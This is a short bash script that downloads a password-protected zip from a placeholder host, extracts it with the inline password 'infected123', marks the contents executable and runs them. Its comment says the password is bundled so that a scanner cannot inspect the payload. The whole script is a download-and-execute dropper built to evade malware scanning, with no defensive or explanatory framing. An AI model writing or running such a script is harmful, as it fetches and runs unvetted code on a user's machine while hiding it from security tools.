#!/usr/bin/env bash
# Fetches an encrypted archive and unpacks it with an inline password — the
# password ships alongside the payload so a scanner cannot inspect the contents.
curl -sSL https://example.invalid/helper.zip -o helper.zip
unzip -P "infected123" helper.zip
chmod +x helper && ./helper
